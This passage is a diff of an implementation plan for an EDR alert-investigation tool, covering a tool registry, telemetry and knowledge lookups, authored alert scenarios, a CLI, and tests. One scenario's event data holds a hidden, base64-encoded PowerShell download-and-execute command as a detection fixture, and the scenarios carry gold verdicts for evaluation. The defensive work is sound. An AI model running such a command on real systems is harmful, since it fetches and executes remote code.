   - `ToolRegistry`: `register(name, description, args_model) -> Callable[[ToolFn], ToolFn]` (decorator), `names() -> list[str]`, `spec(name) -> ToolSpec`, `openai_schemas() -> list[dict[str, Any]]`, `call(ctx, name, raw_args: Mapping[str, Any]) -> ToolResult`
 
-- [ ] **Step 1: Write failing tests**
+- [ ] Step 1: Write failing tests
 
 `tests/tools/__init__.py`: empty.
 
@@ -1542,11 +1463,9 @@ from alert2attack.store.case_store import CaseStore
 from alert2attack.tools.context import EvidenceLedger, ToolContext, ToolResult
 from alert2attack.tools.registry import ToolRegistry
 
-
 class EchoArgs(BaseModel):
     model_config = ConfigDict(extra="forbid")
     n: int = Field(ge=0, description="how many ids to return")
-
 
 @pytest.fixture
 def ctx(downloader_scenario: Scenario) -> ToolContext:
@@ -1558,7 +1477,6 @@ def ctx(downloader_scenario: Scenario) -> ToolContext:
         ledger=EvidenceLedger(),
         knowledge=KnowledgeBase.load_default(),
     )
-
 
 @pytest.fixture
 def registry() -> ToolRegistry:
@@ -1575,7 +1493,6 @@ def registry() -> ToolRegistry:
 
     return reg
 
-
 def test_openai_schema_shape(registry: ToolRegistry) -> None:
     schemas = registry.openai_schemas()
     echo = next(s for s in schemas if s["function"]["name"] == "echo")
@@ -1585,7 +1502,6 @@ def test_openai_schema_shape(registry: ToolRegistry) -> None:
     assert params["properties"]["n"]["description"] == "how many ids to return"
     assert params["additionalProperties"] is False
     assert registry.names() == ["boom", "echo"]
-
 
 def test_call_records_evidence_in_ledger(registry: ToolRegistry, ctx: ToolContext) -> None:
     result = registry.call(ctx, "echo", {"n": 2})
@@ -1598,13 +1514,11 @@ def test_call_records_evidence_in_ledger(registry: ToolRegistry, ctx: ToolContex
     assert rec.duration_ms >= 0
     assert ctx.ledger.first_seen("ev-0002") == 1
 
-
 def test_unknown_tool_is_an_error_result_not_an_exception(registry: ToolRegistry, ctx: ToolContext) -> None:
     result = registry.call(ctx, "nope", {})
     assert not result.ok and result.error is not None
     assert "unknown tool 'nope'" in result.error and "echo" in result.error
     assert ctx.ledger.calls[-1].ok is False
-
 
 def test_invalid_args_is_an_error_result(registry: ToolRegistry, ctx: ToolContext) -> None:
     result = registry.call(ctx, "echo", {"n": -1})
@@ -1613,11 +1527,9 @@ def test_invalid_args_is_an_error_result(registry: ToolRegistry, ctx: ToolContex
     assert not result.ok and result.error is not None and "extra" in result.error
     assert ctx.ledger.ids() == frozenset()
 
-
 def test_tool_exception_is_captured(registry: ToolRegistry, ctx: ToolContext) -> None:
     result = registry.call(ctx, "boom", {"n": 0})
     assert not result.ok and result.error is not None and "kaboom" in result.error
-
 
 def test_duplicate_registration_rejected(registry: ToolRegistry) -> None:
     with pytest.raises(ValueError, match="already registered"):
@@ -1627,12 +1539,12 @@ def test_duplicate_registration_rejected(registry: ToolRegistry) -> None:
             return ToolResult()
 ```
 
-- [ ] **Step 2: Run tests to verify they fail**
+- [ ] Step 2: Run tests to verify they fail
 
 Run: `uv run pytest tests/tools/test_registry.py -q`
 Expected: `ModuleNotFoundError: No module named 'alert2attack.tools'`
 
-- [ ] **Step 3: Write `src/alert2attack/tools/context.py`**
+- [ ] Step 3: Write `src/alert2attack/tools/context.py`
 
 ```python
 """Shared tool plumbing: results, call records, the evidence ledger, the context handle."""
@@ -1645,7 +1557,6 @@ from pydantic import BaseModel, Field
 from alert2attack.knowledge.base import KnowledgeBase
 from alert2attack.store.case_store import CaseStore
 
-
 class ToolResult(BaseModel):
     ok: bool = True
     data: Any = None
@@ -1657,7 +1568,6 @@ class ToolResult(BaseModel):
     def fail(cls, message: str) -> "ToolResult":
         return cls(ok=False, error=message)
 
-
 class ToolCallRecord(BaseModel):
     seq: int
     tool: str
@@ -1666,7 +1576,6 @@ class ToolCallRecord(BaseModel):
     evidence_ids: list[str]
     error: str | None
     duration_ms: float
-
 
 @dataclass
 class EvidenceLedger:
@@ -1689,7 +1598,6 @@ class EvidenceLedger:
     def first_seen(self, evidence_id: str) -> int | None:
         return self._first_seen.get(evidence_id)
 
-
 @dataclass(frozen=True)
 class ToolContext:
     store: CaseStore
@@ -1698,7 +1606,7 @@ class ToolContext:
     knowledge: KnowledgeBase
 ```
 
-- [ ] **Step 4: Write `src/alert2attack/tools/registry.py`**
+- [ ] Step 4: Write `src/alert2attack/tools/registry.py`
 
 ```python
 """Tool registry: name → (args schema, function). The only entry point the agent gets."""
@@ -1714,14 +1622,12 @@ from alert2attack.tools.context import ToolCallRecord, ToolContext, ToolResult
 
 ToolFn = Callable[[ToolContext, Any], ToolResult]
 
-
 @dataclass(frozen=True)
 class ToolSpec:
     name: str
     description: str
     args_model: type[BaseModel]
     fn: ToolFn
-
 
 class ToolRegistry:
     def __init__(self) -> None:
@@ -1788,12 +1694,12 @@ class ToolRegistry:
         return result
 ```
 
-- [ ] **Step 5: Run tests**
+- [ ] Step 5: Run tests
 
 Run: `uv run pytest tests/tools/test_registry.py -q`
 Expected: 6 passed.
 
-- [ ] **Step 6: Lint and commit**
+- [ ] Step 6: Lint and commit
 
 ```bash
 uv run ruff check . && uv run mypy
@@ -1801,19 +1707,17 @@ git add src/alert2attack/tools/context.py src/alert2attack/tools/registry.py tes
 git commit -m "feat(tools): ToolResult, EvidenceLedger, ToolContext and ToolRegistry with OpenAI schemas"
 ```
 
----
-
 ### Task 7: Telemetry tools
 
-**Files:**
+Files:
 - Create: `src/alert2attack/tools/telemetry.py`
 - Test: `tests/tools/test_telemetry.py`
 
-**Interfaces:**
+Interfaces:
 - Consumes: `ToolRegistry.register`, `ToolContext`, `CaseStore` queries, `Event`, `EventKind`.
 - Produces: `register_telemetry_tools(registry: ToolRegistry) -> None` registering `get_alert`, `get_process`, `get_process_tree`, `get_events_for_process`, `search_events`; helper `render_event(e: Event) -> dict[str, Any]`.
 
-- [ ] **Step 1: Write failing tests**
+- [ ] Step 1: Write failing tests
 
 `tests/tools/test_telemetry.py`:
 
@@ -1827,7 +1731,6 @@ from alert2attack.tools.context import EvidenceLedger, ToolContext
 from alert2attack.tools.registry import ToolRegistry
 from alert2attack.tools.telemetry import register_telemetry_tools
 
-
 @pytest.fixture
 def ctx(downloader_scenario: Scenario) -> ToolContext:
     store = CaseStore()
@@ -1839,13 +1742,11 @@ def ctx(downloader_scenario: Scenario) -> ToolContext:
         knowledge=KnowledgeBase.load_default(),
     )
 
-
 @pytest.fixture
 def reg() -> ToolRegistry:
     r = ToolRegistry()
     register_telemetry_tools(r)
     return r
-
 
 def test_registered_names(reg: ToolRegistry) -> None:
     assert reg.names() == [
@@ -1856,7 +1757,6 @@ def test_registered_names(reg: ToolRegistry) -> None:
         "search_events",
     ]
 
-
 def test_get_alert_returns_trigger_and_window(reg: ToolRegistry, ctx: ToolContext) -> None:
     r = reg.call(ctx, "get_alert", {})
     assert r.ok
@@ -1865,7 +1765,6 @@ def test_get_alert_returns_trigger_and_window(reg: ToolRegistry, ctx: ToolContex
     assert r.data["window"] == {"start": "2024-03-12T09:55:00Z", "end": "2024-03-12T10:25:00Z"}
     assert r.evidence_ids == ["ev-0004"]
 
-
 def test_get_process_found_and_missing(reg: ToolRegistry, ctx: ToolContext) -> None:
     r = reg.call(ctx, "get_process", {"pid": 4120})
     assert r.ok and r.data["event_id"] == "ev-0003" and r.evidence_ids == ["ev-0003"]
@@ -1873,7 +1772,6 @@ def test_get_process_found_and_missing(reg: ToolRegistry, ctx: ToolContext) -> N
     miss = reg.call(ctx, "get_process", {"pid": 31337})
     assert not miss.ok and miss.error is not None and "31337" in miss.error
     assert miss.evidence_ids == []
-
 
 def test_get_process_tree_ancestors_and_descendants(reg: ToolRegistry, ctx: ToolContext) -> None:
     r = reg.call(ctx, "get_process_tree", {"pid": 5288, "depth": 3})
@@ -1884,13 +1782,11 @@ def test_get_process_tree_ancestors_and_descendants(reg: ToolRegistry, ctx: Tool
     assert set(r.evidence_ids) == {"ev-0004", "ev-0003", "ev-0002", "ev-0001", "ev-0008"}
     assert r.truncated is False
 
-
 def test_get_process_tree_depth_is_bounded(reg: ToolRegistry, ctx: ToolContext) -> None:
     r = reg.call(ctx, "get_process_tree", {"pid": 5288, "depth": 1})
     assert [a["pid"] for a in r.data["ancestors"]] == [4120]
     bad = reg.call(ctx, "get_process_tree", {"pid": 5288, "depth": 9})
     assert not bad.ok
-
 
 def test_get_events_for_process_with_kind_filter(reg: ToolRegistry, ctx: ToolContext) -> None:
     r = reg.call(ctx, "get_events_for_process", {"pid": 5288})
@@ -1899,14 +1795,12 @@ def test_get_events_for_process_with_kind_filter(reg: ToolRegistry, ctx: ToolCon
     reg_only = reg.call(ctx, "get_events_for_process", {"pid": 5288, "kinds": ["registry_set"]})
     assert [e["event_id"] for e in reg_only.data["events"]] == ["ev-0007"]
 
-
 def test_search_events_contains_and_truncation(reg: ToolRegistry, ctx: ToolContext) -> None:
     r = reg.call(ctx, "search_events", {"contains": "185.220.101.4"})
     assert {e["event_id"] for e in r.data["events"]} == {"ev-0005", "ev-0010"}
     small = reg.call(ctx, "search_events", {"kind": "process_create", "limit": 2})
     assert len(small.data["events"]) == 2 and small.truncated is True
     assert small.data["next_offset"] == 2
-
 
 def test_search_events_clamps_time_to_window(reg: ToolRegistry, ctx: ToolContext) -> None:
     r = reg.call(
@@ -1918,7 +1812,6 @@ def test_search_events_clamps_time_to_window(reg: ToolRegistry, ctx: ToolContext
     assert r.data["clamped_to_window"] is True
     assert r.data["since"] == "2024-03-12T09:55:00Z" and r.data["until"] == "2024-03-12T10:25:00Z"
 
-
 def test_every_returned_event_is_in_ledger(reg: ToolRegistry, ctx: ToolContext) -> None:
     reg.call(ctx, "get_alert", {})
     reg.call(ctx, "get_process_tree", {"pid": 5288, "depth": 2})
@@ -1927,12 +1820,12 @@ def test_every_returned_event_is_in_ledger(reg: ToolRegistry, ctx: ToolContext) 
     assert ctx.ledger.ids() == {"ev-0002", "ev-0003", "ev-0004", "ev-0005", "ev-0008", "ev-0010"}
 ```
 
-- [ ] **Step 2: Run tests to verify they fail**
+- [ ] Step 2: Run tests to verify they fail
 
 Run: `uv run pytest tests/tools/test_telemetry.py -q`
 Expected: `ImportError: cannot import name 'register_telemetry_tools'`
 
-- [ ] **Step 3: Write `src/alert2attack/tools/telemetry.py`**
+- [ ] Step 3: Write `src/alert2attack/tools/telemetry.py`
 
 ```python
 """Tools that read boxed telemetry. Every event they return is stamped into the ledger."""
@@ -1950,27 +1843,21 @@ from alert2attack.tools.registry import ToolRegistry
 MAX_TREE_NODES = 50
 MAX_PAGE = 50
 
-
 def render_event(e: Event) -> dict[str, Any]:
     return e.model_dump(mode="json", exclude_none=True)
-
 
 def _iso_z(ts: datetime) -> str:
     return ts.strftime("%Y-%m-%dT%H:%M:%SZ")
 
-
 class NoArgs(BaseModel):
     model_config = ConfigDict(extra="forbid")
-
 
 class PidArgs(BaseModel):
     model_config = ConfigDict(extra="forbid")
     pid: int = Field(ge=0, description="Process id on the alert host")
 
-
 class ProcessTreeArgs(PidArgs):
     depth: int = Field(default=2, ge=1, le=4, description="How many generations up and down to walk")
-
 
 class ProcessEventsArgs(PidArgs):
     kinds: list[EventKind] | None = Field(
@@ -1978,7 +1865,6 @@ class ProcessEventsArgs(PidArgs):
     )
     limit: int = Field(default=MAX_PAGE, ge=1, le=MAX_PAGE)
     offset: int = Field(default=0, ge=0)
-
 
 class SearchArgs(BaseModel):
     model_config = ConfigDict(extra="forbid")
@@ -1994,7 +1880,6 @@ class SearchArgs(BaseModel):
     until: datetime | None = Field(default=None, description="ISO-8601 upper bound, clamped to the case window")
     limit: int = Field(default=25, ge=1, le=MAX_PAGE)
     offset: int = Field(default=0, ge=0)
-
 
 def register_telemetry_tools(registry: ToolRegistry) -> None:
     @registry.register(
@@ -2137,12 +2022,12 @@ def register_telemetry_tools(registry: ToolRegistry) -> None:
         )
 ```
 
-- [ ] **Step 4: Run tests**
+- [ ] Step 4: Run tests
 
 Run: `uv run pytest tests/tools -q`
 Expected: all pass (15 tests).
 
-- [ ] **Step 5: Lint and commit**
+- [ ] Step 5: Lint and commit
 
 ```bash
 uv run ruff check . && uv run mypy
@@ -2150,19 +2035,17 @@ git add src/alert2attack/tools/telemetry.py tests/tools/test_telemetry.py
 git commit -m "feat(tools): boxed telemetry tools (alert, process, tree, per-process events, search)"
 ```
 
----
-
 ### Task 8: Knowledge tools and the default registry
 
-**Files:**
+Files:
 - Create: `src/alert2attack/tools/knowledge_tools.py`, `src/alert2attack/tools/__init__.py`
 - Test: `tests/tools/test_knowledge_tools.py`
 
-**Interfaces:**
+Interfaces:
 - Consumes: `KnowledgeBase`, `decode_powershell`, `rule_evidence_id`, `technique_evidence_id`.
 - Produces: `register_knowledge_tools(registry) -> None` registering `lookup_sigma_rule`, `lookup_attack_technique`, `decode_powershell`; `default_registry() -> ToolRegistry` with all 8 tools.
 
-- [ ] **Step 1: Write failing tests**
+- [ ] Step 1: Write failing tests
 
 `tests/tools/test_knowledge_tools.py`:
 
@@ -2175,7 +2058,6 @@ from alert2attack.store.case_store import CaseStore
 from alert2attack.tools import default_registry
 from alert2attack.tools.context import EvidenceLedger, ToolContext
 
-
 @pytest.fixture
 def ctx(downloader_scenario: Scenario) -> ToolContext:
     store = CaseStore()
@@ -2186,7 +2068,6 @@ def ctx(downloader_scenario: Scenario) -> ToolContext:
         ledger=EvidenceLedger(),
         knowledge=KnowledgeBase.load_default(),
     )
-
 
 def test_default_registry_has_all_eight_tools() -> None:
     assert default_registry().names() == [
@@ -2200,7 +2081,6 @@ def test_default_registry_has_all_eight_tools() -> None:
         "search_events",
     ]
 
-
 def test_lookup_sigma_rule(ctx: ToolContext) -> None:
     reg = default_registry()
     r = reg.call(ctx, "lookup_sigma_rule", {"rule_id": "win_powershell_encoded_command"})
@@ -2211,7 +2091,6 @@ def test_lookup_sigma_rule(ctx: ToolContext) -> None:
     miss = reg.call(ctx, "lookup_sigma_rule", {"rule_id": "does_not_exist"})
     assert not miss.ok and miss.error is not None and "does_not_exist" in miss.error
 
-
 def test_lookup_attack_technique(ctx: ToolContext) -> None:
     reg = default_registry()
     r = reg.call(ctx, "lookup_attack_technique", {"technique_id": "t1547.001"})
@@ -2219,7 +2098,6 @@ def test_lookup_attack_technique(ctx: ToolContext) -> None:
     assert r.evidence_ids == ["attack-T1547.001"]
     assert not reg.call(ctx, "lookup_attack_technique", {"technique_id": "T9999"}).ok
     assert not reg.call(ctx, "lookup_attack_technique", {"technique_id": "1547"}).ok
-
 
 def test_decode_powershell_tool_is_derived_not_evidence(ctx: ToolContext) -> None:
     reg = default_registry()
@@ -2231,12 +2109,12 @@ def test_decode_powershell_tool_is_derived_not_evidence(ctx: ToolContext) -> Non
     assert ctx.ledger.ids() == {"ev-0004"}
 ```
 
-- [ ] **Step 2: Run tests to verify they fail**
+- [ ] Step 2: Run tests to verify they fail
 
 Run: `uv run pytest tests/tools/test_knowledge_tools.py -q`
 Expected: `ImportError: cannot import name 'default_registry'`
 
-- [ ] **Step 3: Write `src/alert2attack/tools/knowledge_tools.py`**
+- [ ] Step 3: Write `src/alert2attack/tools/knowledge_tools.py`
 
 ```python
 """Tools over the vendored knowledge base and the deterministic decoder."""
@@ -2250,13 +2128,11 @@ from alert2attack.knowledge.powershell import decode_powershell as _decode
 from alert2attack.tools.context import ToolContext, ToolResult
 from alert2attack.tools.registry import ToolRegistry
 
-
 class RuleArgs(BaseModel):
     model_config = ConfigDict(extra="forbid")
     rule_id: str = Field(
         min_length=1, description="Sigma rule slug exactly as shown in the alert's rule_id"
     )
-
 
 class TechniqueArgs(BaseModel):
     model_config = ConfigDict(extra="forbid")
@@ -2264,11 +2140,9 @@ class TechniqueArgs(BaseModel):
         pattern=r"^[Tt]\d{4}(\.\d{3})?$", description="ATT&CK technique id, e.g. T1059.001"
     )
 
-
 class DecodeArgs(BaseModel):
     model_config = ConfigDict(extra="forbid")
     command_line: str = Field(min_length=1, description="Full command line to inspect")
-
 
 def register_knowledge_tools(registry: ToolRegistry) -> None:
     @registry.register(
@@ -2312,7 +2186,7 @@ def register_knowledge_tools(registry: ToolRegistry) -> None:
         return ToolResult(data=result.model_dump())
 ```
 
-- [ ] **Step 4: Write `src/alert2attack/tools/__init__.py`**
+- [ ] Step 4: Write `src/alert2attack/tools/__init__.py`
 
 ```python
 from alert2attack.tools.context import EvidenceLedger, ToolCallRecord, ToolContext, ToolResult
@@ -2320,13 +2194,11 @@ from alert2attack.tools.knowledge_tools import register_knowledge_tools
 from alert2attack.tools.registry import ToolRegistry, ToolSpec
 from alert2attack.tools.telemetry import register_telemetry_tools
 
-
 def default_registry() -> ToolRegistry:
     registry = ToolRegistry()
     register_telemetry_tools(registry)
     register_knowledge_tools(registry)
     return registry
-
 
 __all__ = [
     "EvidenceLedger",
@@ -2339,12 +2211,12 @@ __all__ = [
 ]
 ```
 
-- [ ] **Step 5: Run tests**
+- [ ] Step 5: Run tests
 
 Run: `uv run pytest -q`
 Expected: all pass.
 
-- [ ] **Step 6: Lint and commit**
+- [ ] Step 6: Lint and commit
 
 ```bash
 uv run ruff check . && uv run mypy
@@ -2352,19 +2224,17 @@ git add src/alert2attack/tools tests/tools/test_knowledge_tools.py
 git commit -m "feat(tools): Sigma/ATT&CK lookup and PowerShell decode tools; default_registry"
 ```
 
----
-
 ### Task 9: Two more authored scenarios (benign twin, not-enough-evidence) and a dataset-wide test
 
-**Files:**
+Files:
 - Create: `datasets/scenarios/enc_ps_sccm_benign_001/manifest.yaml`, `datasets/scenarios/enc_ps_sccm_benign_001/events.jsonl`, `datasets/scenarios/enc_ps_truncated_001/manifest.yaml`, `datasets/scenarios/enc_ps_truncated_001/events.jsonl`
 - Test: `tests/datasets/__init__.py`, `tests/datasets/test_all_scenarios.py`
 
-**Interfaces:**
+Interfaces:
 - Consumes: `iter_scenarios`, `CaseStore`, `KnowledgeBase`, `default_registry`.
 - Produces: three committed scenarios, one per gold verdict class.
 
-- [ ] **Step 1: Write the benign twin**
+- [ ] Step 1: Write the benign twin
 
 `datasets/scenarios/enc_ps_sccm_benign_001/manifest.yaml`:
 
@@ -2414,7 +2284,7 @@ gold:
 {"event_id":"ev-0006","kind":"process_create","ts":"2024-03-12T03:15:00Z","host":"WS-ENG-22","user":"NT AUTHORITY\\SYSTEM","pid":8004,"ppid":716,"image":"C:\\Windows\\System32\\svchost.exe","command_line":"C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s wuauserv","parent_image":"C:\\Windows\\System32\\services.exe","source_event_code":1}
 ```
 
-- [ ] **Step 2: Write the not-enough-evidence case**
+- [ ] Step 2: Write the not-enough-evidence case
 
 `datasets/scenarios/enc_ps_truncated_001/manifest.yaml`:
 
@@ -2461,7 +2331,7 @@ gold:
 {"event_id":"ev-0002","kind":"process_create","ts":"2024-03-12T10:14:31Z","host":"SRV-APP-03","user":"CORP\\svc-deploy","pid":3156,"ppid":3120,"image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","command_line":"powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZgBpAGwAZQBzAC4AYwBvAHIAcAAuAGwAbwBjAGEAbAAvAHMAZQB0AHUAcAAuAHAAcwAxACcAKQA=","parent_image":"C:\\Windows\\System32\\cmd.exe","parent_command_line":"\"C:\\Windows\\system32\\cmd.exe\"","source_event_code":1}
 ```
 
-- [ ] **Step 3: Write the dataset-wide test**
+- [ ] Step 3: Write the dataset-wide test
 
 `tests/datasets/__init__.py`: empty.
 
@@ -2481,11 +2351,9 @@ from alert2attack.tools.context import EvidenceLedger, ToolContext
 SCENARIOS = list(iter_scenarios(SCENARIOS_ROOT))
 KB = KnowledgeBase.load_default()
 
-
 def test_one_scenario_per_gold_verdict_class_exists() -> None:
     verdicts = {s.gold.verdict for s in SCENARIOS if s.gold}
     assert verdicts == {"malicious", "likely_benign", "not_enough_evidence"}
-
 
 @pytest.mark.parametrize("scenario", SCENARIOS, ids=lambda s: s.scenario_id)
 def test_scenario_invariants(scenario: Scenario) -> None:
@@ -2502,7 +2370,6 @@ def test_scenario_invariants(scenario: Scenario) -> None:
     assert not (set(scenario.gold.acceptable_actions) & set(scenario.gold.unacceptable_actions))
     assert "GOLD-MARKER" in scenario.gold.narrative
 
-
 @pytest.mark.parametrize("scenario", SCENARIOS, ids=lambda s: s.scenario_id)
 def test_every_scenario_loads_fully_and_tools_reach_the_trigger(scenario: Scenario) -> None:
     store = CaseStore()
@@ -2517,12 +2384,12 @@ def test_every_scenario_loads_fully_and_tools_reach_the_trigger(scenario: Scenar
     assert "GOLD-MARKER" not in store.dump_text()
 ```
 
-- [ ] **Step 4: Run tests**
+- [ ] Step 4: Run tests
 
 Run: `uv run pytest -q`
 Expected: all pass (77 tests), including 7 dataset-parametrised tests.
 
-- [ ] **Step 5: Lint and commit**
+- [ ] Step 5: Lint and commit
 
 ```bash
 uv run ruff check . && uv run mypy
@@ -2530,19 +2397,17 @@ git add datasets/scenarios tests/datasets
 git commit -m "data: benign SCCM twin and truncated-window scenarios; dataset invariants test"
 ```
 
----
-
 ### Task 10: CLI for manual investigation and README
 
-**Files:**
+Files:
 - Create: `src/alert2attack/cli.py`, `README.md`
 - Test: `tests/test_cli.py`
 
-**Interfaces:**
+Interfaces:
 - Consumes: `iter_scenarios`, `load_scenario`, `CaseStore`, `KnowledgeBase`, `default_registry`.
 - Produces: console script `alert2attack` with `scenarios list`, `scenarios show <id>`, `tools`, `tool <name> --scenario <id> [key=value ...]`.
 
-- [ ] **Step 1: Write failing tests**
+- [ ] Step 1: Write failing tests
 
 `tests/test_cli.py`:
 
@@ -2555,13 +2420,11 @@ from alert2attack.cli import app
 
 runner = CliRunner()
 
-
 def test_scenarios_list() -> None:
     result = runner.invoke(app, ["scenarios", "list"])
     assert result.exit_code == 0, result.output
     assert "enc_ps_downloader_001" in result.output
     assert "malicious" in result.output
-
 
 def test_scenarios_show_hides_gold_by_default() -> None:
     result = runner.invoke(app, ["scenarios", "show", "enc_ps_downloader_001"])
@@ -2571,12 +2434,10 @@ def test_scenarios_show_hides_gold_by_default() -> None:
     with_gold = runner.invoke(app, ["scenarios", "show", "enc_ps_downloader_001", "--gold"])
     assert "GOLD-MARKER" in with_gold.output
 
-
 def test_tools_lists_schemas() -> None:
     result = runner.invoke(app, ["tools"])
     assert result.exit_code == 0, result.output
     assert "get_process_tree" in result.output and "depth" in result.output
-
 
 def test_tool_call_prints_result_and_ledger() -> None:
     result = runner.invoke(
@@ -2588,12 +2449,10 @@ def test_tool_call_prints_result_and_ledger() -> None:
     assert payload["result"]["data"]["ancestors"][0]["pid"] == 4120
     assert payload["ledger"] == ["ev-0003", "ev-0004", "ev-0008"]
 
-
 def test_tool_call_with_bad_args_exits_nonzero() -> None:
     result = runner.invoke(app, ["tool", "get_process", "--scenario", "enc_ps_downloader_001", "pid=abc"])
     assert result.exit_code == 1
     assert "invalid arguments" in result.output
-
 
 def test_unknown_scenario_exits_nonzero() -> None:
     result = runner.invoke(app, ["tool", "get_alert", "--scenario", "nope"])
@@ -2601,12 +2460,12 @@ def test_unknown_scenario_exits_nonzero() -> None:
     assert "nope" in result.output
 ```
 
-- [ ] **Step 2: Run tests to verify they fail**
+- [ ] Step 2: Run tests to verify they fail
 
 Run: `uv run pytest tests/test_cli.py -q`
 Expected: `ModuleNotFoundError: No module named 'alert2attack.cli'`
 
-- [ ] **Step 3: Write `src/alert2attack/cli.py`**
+- [ ] Step 3: Write `src/alert2attack/cli.py`
 
 ```python
 """alert2attack command line: inspect scenarios and call tools by hand."""
@@ -2629,14 +2488,12 @@ app.add_typer(scenarios_app, name="scenarios", help="List and inspect scenarios.
 
 RootOpt = Annotated[Path, typer.Option("--root", help="Scenario root directory")]
 
-
 def _find(root: Path, scenario_id: str) -> Scenario:
     path = root / scenario_id
     if not (path / "manifest.yaml").exists():
         typer.echo(f"error: scenario '{scenario_id}' not found under {root}", err=True)
         raise typer.Exit(code=2)
     return load_scenario(path)
-
 
 def _parse_kv(pairs: list[str]) -> dict[str, Any]:
     args: dict[str, Any] = {}
@@ -2651,14 +2508,12 @@ def _parse_kv(pairs: list[str]) -> dict[str, Any]:
             args[key] = raw
     return args
 
-
 @scenarios_app.command("list")
 def scenarios_list(root: RootOpt = SCENARIOS_ROOT) -> None:
     """One line per scenario: id, split, origin, gold verdict, event count."""
     for s in iter_scenarios(root):
         verdict = s.gold.verdict if s.gold else "-"
         typer.echo(f"{s.scenario_id:32} {s.split:5} {s.origin:9} {verdict:20} {len(s.events):4} events")
-
 
 @scenarios_app.command("show")
 def scenarios_show(
@@ -2671,12 +2526,10 @@ def scenarios_show(
     view = s if gold else s.public()
     typer.echo(view.model_dump_json(indent=2, exclude_none=True))
 
-
 @app.command("tools")
 def tools() -> None:
     """Print the tool schemas exactly as an LLM would receive them."""
     typer.echo(json.dumps(default_registry().openai_schemas(), indent=2))
-
 
 @app.command("tool")
 def tool(
@@ -2704,7 +2557,7 @@ def tool(
         raise typer.Exit(code=1)
 ```
 
-- [ ] **Step 4: Write `README.md` (replaces the planning-stage README at the repo root)**
+- [ ] Step 4: Write `README.md` (replaces the planning-stage README at the repo root)
 
 ```markdown
 # alert2attack
@@ -2713,7 +2566,7 @@ Sourced case files from EDR alerts. An investigation agent that works an endpoin
 analyst does — process tree, command line, detection rule, "what else happened on this host" — and
 writes a verdict where every claim cites a tool result.
 
-Design: `docs/superpowers/specs/2026-09-09-edr-investigation-agent-design.md`.
+Design: `docs/design/2026-09-09-edr-investigation-agent-design.md`.
 Current phase: **1 — case store, sandboxed tools, evidence ledger** (no LLM yet).
 
 ## Run
@@ -2745,25 +2598,23 @@ uv run ruff check . && uv run mypy
 - `datasets/scenarios/<id>/` — `manifest.yaml` (alert, window, gold) + `events.jsonl`.
 ```
 
-- [ ] **Step 5: Run tests**
+- [ ] Step 5: Run tests
 
 Run: `uv run pytest -q`
 Expected: all pass.
 
-- [ ] **Step 6: Try the CLI by hand**
+- [ ] Step 6: Try the CLI by hand
 
 Run: `uv run alert2attack tool get_process_tree --scenario enc_ps_downloader_001 pid=5288 depth=3`
 Expected: JSON with `ancestors` pids `[4120, 3344, 1180]`, `descendants` pid `5304`, `ledger` of five ids.
 
-- [ ] **Step 7: Lint and commit**
+- [ ] Step 7: Lint and commit
 
 ```bash
 uv run ruff check . && uv run mypy
 git add src/alert2attack/cli.py tests/test_cli.py README.md
 git commit -m "feat(cli): scenarios list/show, tools, tool <name> for manual investigation; README"
 ```
-
----
 
 ## Definition of done for Phase 1
 
